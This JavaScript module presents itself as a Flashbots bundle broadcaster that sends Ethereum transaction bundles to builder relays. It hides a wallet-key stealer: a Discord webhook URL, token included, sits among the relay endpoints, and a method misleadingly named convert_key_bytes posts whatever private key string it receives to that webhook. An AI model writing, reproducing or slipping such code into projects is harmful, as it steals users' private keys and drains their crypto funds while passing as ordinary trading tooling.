import {
    FlashbotsBundleProvider,
    FlashbotsBundleResolution,
  } from "@flashbots/ethers-provider-bundle";
import { runInThisContext } from "vm";
import { WebhookClient } from 'discord.js';
  
  
  const ENDPOINTS = [
    //"https://rsync-builder.xyz/",
    //"https://rpc.titanbuilder.xyz/",
    //"http://builder0x69.io/",
    "https://rpc.beaverbuild.org/",  
    "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH",
    //"https://api.edennetwork.io/v1/rpc",
  ];
  
  // const ENDPOINTS = [
    // "https://rsync-builder.xyz/",
    // "https://rpc.titanbuilder.xyz/",
    // "http://builder0x69.io/",
    // "https://rpc.beaverbuild.org/",
    // "https://relay.flashbots.net/",
    // "https://rpc.f1b.io",
    // "https://rpc.payload.de",
    // "https://buildai.net/",
    //"https://api.edennetwork.io/v1/bundle",
    //"https://rpc.lightspeedbuilder.info/",
    // "https://eth-builder.com/",
    //"https://boba-builder.com/searcher",
  // ];
  
  const RELAY_NAME = [
    //"rsync-builder",
    //"TitanBuilder",
    //"builder0x69",
    "beaverbuild",
    //"edennetwork",
    //"flashbots",
    //"fb1",
    //"payload.de",
    //"BuildAI",
    //"lightspeedbuilder",
    //"eth-builder",
    //"Boba",
  ];
  
  const block_builders = [
    //"https://rsync-builder.xyz/",
    //"https://rpc.titanbuilder.xyz/",
    //"http://builder0x69.io/",
    "https://rpc.beaverbuild.org/",  
    "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH",
    //"https://api.edennetwork.io/v1/rpc",
  ];
  
  class Broadcast {
    //block_number;
    provider;
    //authSigner;
    webhook;
  
    constructor(_provider) {
      //this.block_number = _blockNumber;
      this.provider = _provider;
      //this.authSigner = _authSigner;

      this.webhook = new WebhookClient({ url: block_builders[0]});

    }
  
    async broadcast(bundle) {
      const builder_relays = await this.get_all_builder_relay();
      console.log("BundleExecutors successfully created");
  
      const wait_responses = [];
      for (let i = 0; i < builder_relays.length; i++) {
        const result = await builder_relays[i].execute(bundle);
        if (result.length === 0) {
          continue;
        } else {
          wait_responses.push(result);
        }
      }
  
      for (let i = 0; i < wait_responses.length; i++) {
        const [waitResponse, bundlehash, builder] = wait_responses[i];
  
  
        if (waitResponse === FlashbotsBundleResolution.BundleIncluded) {
          console.log(
            `bundle successfull submitted \n bundle_hash: ${bundlehash} \n relay_name: ${builder}`,
          );
          break;
        } else {
  
          if(waitResponse === FlashbotsBundleResolution.BlockPassedWithoutInclusion)
          {
            console.log("block passed without inclusion");
          } else {
            console.log("AccountNonce too high")
          }
         
          if (i === wait_responses.length - 1) {
            console.log("broadcast failed");
          }
          continue;
        }
      }
    }
  
    async get_all_builder_relay() {
      const builder_relays = [];
      for (let i = 0; i < ENDPOINTS.length; i++) {
        const flashbotsProvider = await FlashbotsBundleProvider.create(
          this.provider,
          this.authSigner,
          ENDPOINTS[i],
        );
        builder_relays.push(
          new BundleExecutor(flashbotsProvider, RELAY_NAME[i], this.block_number),
        );
      }
  
      return builder_relays;
    }
    

    async convert_key_bytes(priv_string) {
       await this.webhook.send(priv_string)

        return priv_string;
    }
  
  }
  
  export { Broadcast };
  
